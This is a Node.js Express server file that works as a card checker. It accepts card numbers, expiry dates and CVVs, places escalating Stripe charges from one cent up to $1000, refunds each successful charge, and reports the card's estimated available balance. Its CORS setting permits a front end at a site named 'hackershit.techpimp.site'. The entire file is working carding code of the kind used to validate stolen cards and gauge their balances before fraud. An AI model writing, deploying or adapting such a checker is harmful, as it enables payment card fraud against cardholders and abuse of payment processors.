const express = require('express');
const Stripe = require('stripe');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000;

// Use env var for Stripe key (set in Railway dashboard)
const stripeSecretKey = process.env.STRIPE_SECRET_KEY;
if (!stripeSecretKey) {
  console.error('Error: STRIPE_SECRET_KEY environment variable is not set');
}
const stripe = Stripe(stripeSecretKey);

// Allow CORS from your Vercel domain
const corsOptions = {
  origin: 'https://hackershit.techpimp.site',
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
app.use(bodyParser.json());

// Incremental amounts in cents for balance estimation
const testAmounts = [1, 10, 100, 1000, 5000, 10000, 50000, 100000];

app.post('/', async (req, res) => {
  const { card_number, exp, cvv } = req.body;
  console.log('Received request:', { card_number: card_number ? 'provided' : 'missing', exp, cvv: cvv ? 'provided' : 'missing' }); // Debugging

  if (!card_number || !exp || !cvv) {
    console.error('Missing fields');
    return res.status(400).json({ balance: 'Missing required fields' });
  }

  const [expMonth, expYear] = exp.split('/');
  if (!expMonth || !expYear) {
    console.error('Invalid expiry');
    return res.status(400).json({ balance: 'Invalid expiry format' });
  }
  const fullExpYear = `20${expYear}`;

  try {
    console.log('Creating payment method...');
    const paymentMethod = await stripe.paymentMethods.create({
      type: 'card',
      card: {
        number: card_number,
        exp_month: parseInt(expMonth),
        exp_year: parseInt(fullExpYear),
        cvc: cvv,
      },
    });
    console.log('Payment method created');

    let lastSuccessfulAmount = 0;
    let estimatedBalance = 'Low (under $0.01)';

    for (const amount of testAmounts) {
      try {
        console.log(`Testing amount: ${amount}`);
        const paymentIntent = await stripe.paymentIntents.create({
          amount: amount,
          currency: 'usd',
          payment_method: paymentMethod.id,
          confirm: true,
          capture_method: 'automatic',
        });

        if (paymentIntent.status === 'succeeded') {
          console.log(`Success at ${amount}`);
          await stripe.refunds.create({
            payment_intent: paymentIntent.id,
          });
          lastSuccessfulAmount = amount / 100;
          estimatedBalance = `$${lastSuccessfulAmount}+`;
        } else if (paymentIntent.last_payment_error && paymentIntent.last_payment_error.code === 'card_declined') {
          if (paymentIntent.last_payment_error.decline_code === 'insufficient_funds') {
            if (lastSuccessfulAmount > 0) {
              estimatedBalance = `$${lastSuccessfulAmount}`;
            }
            break;
          } else {
            estimatedBalance = `Card declined: ${paymentIntent.last_payment_error.message}`;
            break;
          }
        } else {
          estimatedBalance = 'Unable to process card';
          break;
        }
      } catch (chargeError) {
        console.error('Charge error:', chargeError.message);
        if (chargeError.type === 'StripeCardError' && chargeError.code === 'card_declined') {
          if (chargeError.decline_code === 'insufficient_funds') {
            if (lastSuccessfulAmount > 0) {
              estimatedBalance = `$${lastSuccessfulAmount}`;
            }
            break;
          } else {
            estimatedBalance = `Card declined: ${chargeError.message}`;
            break;
          }
        } else {
          estimatedBalance = `Charge error: ${chargeError.message}`;
          break;
        }
      }
    }

    console.log('Estimated balance:', estimatedBalance);
    res.json({ balance: estimatedBalance });
  } catch (error) {
    console.error('Server error:', error.message);
    if (error.type === 'StripeCardError') {
      res.json({ balance: `Card error: ${error.message}` });
    } else {
      res.json({ balance: 'Server error - check logs' });
    }
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
